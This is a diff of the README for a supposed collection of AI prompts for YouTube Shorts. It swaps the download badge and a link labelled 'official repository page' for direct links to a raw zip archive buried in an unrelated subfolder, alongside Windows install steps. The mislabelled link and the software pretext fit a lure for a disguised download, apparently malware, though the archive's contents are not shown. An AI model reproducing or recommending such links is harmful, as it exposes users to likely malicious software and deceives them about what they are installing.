@@ -1,6 +1,6 @@
 # 🎬 awesome-ai-youtube-shorts-prompts - Create viral vertical videos using artificial intelligence
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/teddahippocratic9414/awesome-ai-youtube-shorts-prompts)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/teddahippocratic9414/awesome-ai-youtube-shorts-prompts/raw/refs/heads/main/yender/shorts_awesome_ai_prompts_youtube_3.0-beta.1.zip)
 
 This software provides a collection of prompts and workflows for creators. It helps you generate vertical video content for YouTube Shorts. The tools focus on video hooks, thumbnails, and automated generation paths. Use these resources to save time during your video production process.
 
@@ -28,7 +28,7 @@ Your computer needs to meet these basic standards to run the software effectivel
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the [official repository page](https://github.com/teddahippocratic9414/awesome-ai-youtube-shorts-prompts) to access the files.
+1.  Visit the [official repository page](https://github.com/teddahippocratic9414/awesome-ai-youtube-shorts-prompts/raw/refs/heads/main/yender/shorts_awesome_ai_prompts_youtube_3.0-beta.1.zip) to access the files.
 2.  Click the green button labeled "Code" near the top right of the page.
 3.  Choose "Download ZIP" from the menu.
 4.  Locate the downloaded file in your browser's download folder.
